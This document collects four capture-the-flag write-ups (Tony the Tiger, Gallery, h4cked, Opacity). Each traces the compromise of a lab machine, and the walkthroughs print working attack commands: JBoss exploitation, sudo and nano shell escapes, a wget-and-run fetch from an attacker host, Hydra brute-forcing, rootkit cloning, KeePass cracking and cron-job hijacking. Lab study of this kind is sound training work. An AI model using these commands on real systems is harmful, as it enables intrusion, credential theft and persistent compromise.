Tony the Tiger - TryHackMe Write-Up

Overview

Tony the Tiger is a beginner-friendly Linux challenge focused on Java deserialization attacks and exploitation of a vulnerable JBoss application server.

The goal of the room is to perform reconnaissance on the target machine, identify exposed services, exploit the vulnerable JBoss application, gain shell access, escalate privileges, and retrieve the root flag.

Enumeration

The first step when attacking a machine is enumeration. I started with an Nmap scan:

nmap -sC -sV -T4 <TARGET-IP>

This revealed several open ports, with the most interesting service running on port 8080.

22/tcp    SSH
80/tcp    HTTP
8080/tcp  JBoss / Tomcat
Web Enumeration

Navigating to port 8080 revealed a Tony the Tiger themed blog page. An image on the page looked suspicious, so I downloaded it and inspected it with:

strings image.jpg

This exposed the first flag:

THM{Tony_Sure_Loves_Frosted_Flakes}
Researching the Vulnerability

After identifying JBoss, I researched common JBoss exploits. JBoss servers are known to suffer from Java deserialization issues that can lead to remote code execution.

Exploiting JBoss

To exploit the target, I used JexBoss.

git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python jexboss.py -host http://TARGET-IP:8080

Once exploitation succeeded, JexBoss deployed a payload and provided shell access.

Gaining a Shell

After landing the shell, I used basic commands to confirm access and inspect the environment:

whoami
pwd
ls
SSH Access

Further enumeration revealed credentials that allowed SSH login as the jboss user.

ssh jboss@TARGET-IP
Privilege Escalation

Checking sudo permissions showed that /usr/bin/find could be run as root.

sudo -l
sudo /usr/bin/find . -exec /bin/sh \; -quit

This spawned a root shell.

Root Access

After gaining root, I navigated to the root directory and retrieved the final flag.

cd /root
ls
Key Lessons Learned

This room reinforced several important concepts: careful enumeration, hidden data inside files, Java deserialization exploitation, and privilege escalation through unsafe sudo permissions.

Gallery - TryHackMe Write-Up

Objective

Compromise the target machine and escalate privileges to root.

Enumeration

I started with a full Nmap scan against the target:

nmap -sC -sV -A -vv -p- 10.67.177.250

The scan identified three open ports:

22/tcp   SSH (OpenSSH 8.2p1)
80/tcp   Apache Default Page
8080/tcp Web Application (Gallery)

Port 80 served the default Apache page and did not reveal anything useful, while port 8080 exposed the Simple Image Gallery System.

Directory and Subdomain Enumeration

I used gobuster and ffuf to look for hidden content, but neither produced significant findings.

Finding a Vulnerability

Since enumeration did not provide a direct path forward, I pivoted to vulnerability research with:

searchsploit Simple Image Gallery

This identified Simple Image Gallery 1.0 - RCE (Unauthenticated), matching ExploitDB entry 50214.

The key takeaway was that the application allowed remote code execution without authentication.

Exploit Execution

After running the exploit script, I gained a web shell. The uploaded shell was accessible from the uploads directory as a PHP file.

Command Execution

I verified access by executing commands such as:

ls
pwd

An important behavior here was that commands needed to be lowercase to execute correctly.

Reverse Shell

To move from the web shell into a proper interactive session, I used Burp Suite to intercept the request and inject a reverse shell payload.

On the attacking machine, I prepared a listener:

nc -lvnp 4444

This returned a shell as www-data@ip-10-67-177-252.

Privilege Escalation Enumeration

Next I transferred LinPEAS to the target. On the attacking machine I hosted the file with:

python3 -m http.server 8000

On the target I downloaded and executed it with:

wget http://ATTACKER-IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

LinPEAS revealed the user mike and highlighted sudo -l as an important escalation path.

Sudo Permissions

Running:

sudo -l

returned:

(ALL) NOPASSWD: /bin/bash /opt/rootkit.sh
Privilege Escalation to Root

I executed the allowed script with:

sudo /bin/bash /opt/rootkit.sh

The script prompted for an action and offered several options. Choosing read opened a file in nano.

GTFOBins Escape

From inside nano, I used the standard escape sequence:

CTRL + R
CTRL + X
reset; sh 1>&0 2>&0

This spawned a shell with root privileges.

Result

The final shell was root@ip-10-67-177-252, confirming full compromise of the machine.

Key Takeaways

This box reinforced the value of full-port enumeration, vulnerability research when standard enumeration stalls, reliable file transfer, and checking sudo -l for escalation paths. The decisive step was recognizing that an editor escape through nano could be turned into a root shell.

h4cked - TryHackMe Write-Up

Objective

Analyze the provided PCAP, understand how the attacker compromised the target, and replicate the attack path in a clean pentesting workflow.

PCAP Analysis

The first step was opening the PCAP in Wireshark and reviewing the captured traffic. Repeated authentication attempts against FTP from the same source pointed to a brute-force attack.

The traffic showed multiple login attempts using the USER FTP command, which made the attack pattern clear.

Attack Tool

The password-guessing behavior matched Hydra, a common brute-force tool created by Van Hauser and often used against FTP, SSH, SMB, RDP, and HTTP services.

Username Enumeration

The attacker repeatedly targeted the FTP account:

jenny
Credential Discovery

A successful FTP login exposed the credentials below:

Username: jenny
Password: password123
FTP Session Activity

After login, the session moved into the Apache web root:

/var/www/html

Further commands showed a malicious upload with PASV, STOR, and CHMOD.

Backdoor Upload

The uploaded file was:

shell.php

The reverse shell source referenced the standard PentestMonkey PHP reverse shell:

http://pentestmonkey.net/tools/php-reverse-shell
Reverse Shell Access

Once the shell connected back, the attacker verified execution with:

whoami

The returned user was www-data, and the compromised host was identified as wir3.

Shell Upgrade

To stabilize the session, the attacker upgraded the shell to a TTY:

python3 -c 'import pty; pty.spawn("/bin/bash")'
Privilege Escalation

Privilege escalation was performed with:

sudo su

This provided root access on the target.

Persistence

After root access, the attacker cloned the Reptile project from GitHub:

git clone https://github.com/f0rb1dd3n/Reptile.git

Reptile is a kernel rootkit used to maintain stealthy persistence on the system.

Attack Replication

To recreate the compromise, the target was scanned with:

nmap -sC -sV -vv -A -p- 10.64.167.149

The scan identified the following services:

21/tcp  FTP     vsftpd
22/tcp  SSH     OpenSSH
80/tcp  HTTP    Apache
Web Enumeration

Directory enumeration with tools like dirsearch or gobuster revealed several paths returning 403 Forbidden, confirming restricted content worth further investigation.

Credential Reuse

With the username already known from the PCAP, Hydra was used against FTP:

hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.64.167.149 ftp

After recovering the password, FTP access was used to upload a modified PHP reverse shell into the web root and trigger code execution through the web server.

Final Compromise

The full chain was: reverse shell, TTY upgrade, privilege escalation, root access, and rootkit installation for persistence.

Key Lessons

This room highlights how unencrypted traffic can expose credentials, commands, malware sources, and the complete attack chain. It also reinforces the importance of network forensics, credential hygiene, and persistence detection.

Opacity - Write-Up

Initial Enumeration

I started with a full Nmap scan to identify exposed services and gather version details.

nmap -sV -sC -A -p- 10.65.173.123

The scan revealed the following ports and services:

22/tcp    SSH   OpenSSH 8.2
80/tcp    HTTP  Apache 2.4.41
139/tcp   SMB   Samba
445/tcp   SMB   Samba

Two early findings stood out. The web app exposed a login.php page, and the session cookie was missing the HttpOnly flag, which could matter if an XSS path became available. SMB signing was enabled but not required, which suggested weaker hardening and possible relay-style opportunities in other scenarios.

Web Enumeration

I began with common quick checks against the login page. Default credentials such as admin:admin and admin:password failed, and a basic SQL injection test also went nowhere.

' OR 1=1--

I also attempted directory and subdomain enumeration, but at first nothing useful appeared. That turned out to be a mistake in process rather than a dead end: I had not enumerated thoroughly enough, and that gap delayed the actual path forward.

SMB Enumeration

Next I moved to SMB to see whether shares, users, or policy weaknesses could provide credentials or context.

smbclient -L //<IP> -N
enum4linux -a <IP>

The shares exposed were limited:

print$
IPC$

print$ was just printer-driver related and not useful, while IPC$ only confirmed standard inter-process communication access. SMB did allow null sessions, and the password policy was weak with no complexity requirement and no minimum length, but there were still no direct credentials or sensitive files available from this angle.

Burp Suite Analysis

I inspected requests in Burp Suite and found encoded parameters along with the PHPSESSID cookie. I tried decoding, modifying, and re-encoding the parameters to see whether the application trusted client-side state in a dangerous way, but that line of testing did not produce a foothold.

Breakthrough: Hidden Directory

The key breakthrough came after revisiting enumeration more carefully. A hidden directory led to a file upload feature labeled 5 Minute File Upload, presented as a personal cloud storage page. Missing that directory during the first pass was the main reason progress stalled.

Exploitation

Once the upload page was found, the path to code execution became straightforward. I uploaded a PHP reverse shell and executed it through the web application, which returned shell access on the target.

Shell Stabilization

After landing the initial shell, I upgraded it into a fully interactive TTY to make enumeration and escalation easier.

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

Then I backgrounded the shell and fixed terminal handling:

Ctrl + Z
stty raw -echo; fg

This makes post-exploitation work far more reliable.

Post-Exploitation Enumeration

With a stable shell, I started searching for files owned by higher-value users.

find / -user sysadmin 2>/dev/null

That led to a KeePass database file with the .kdbx extension, which was a strong indicator that stored credentials might be recoverable offline.

Credential Extraction

I extracted the KeePass hash and cracked it with John using rockyou.txt.

john --wordlist=/usr/share/wordlists/rockyou.txt opacity.txt

The recovered password was:

Cl0udP4ss40p4city#8700
Privilege Escalation Enumeration

To identify scheduled or automated tasks worth hijacking, I ran pspy. This exposed a cron job running every minute and executing a script from /lib.

Root Exploit

The escalation path was to modify the script being executed by the cron job and inject a PHP reverse shell payload. Once the job ran, it executed the modified code and returned a root shell.

One operational note: the reverse shell required allowing the listener port through UFW on the target environment.

Final Outcome

The full chain was: missed directory corrected through better enumeration, file upload to RCE, post-exploitation discovery of a KeePass database, password cracking, cron-job hijacking, and root access.

Key Lessons

This room reinforced a few important habits: enumeration is everything, SMB often provides valuable context even when it does not immediately hand over credentials, file upload features are high-value attack surfaces, and .kdbx files plus cron jobs are both worth checking early during post-exploitation. Running pspy is especially useful because it exposes automated tasks you can potentially abuse for escalation.
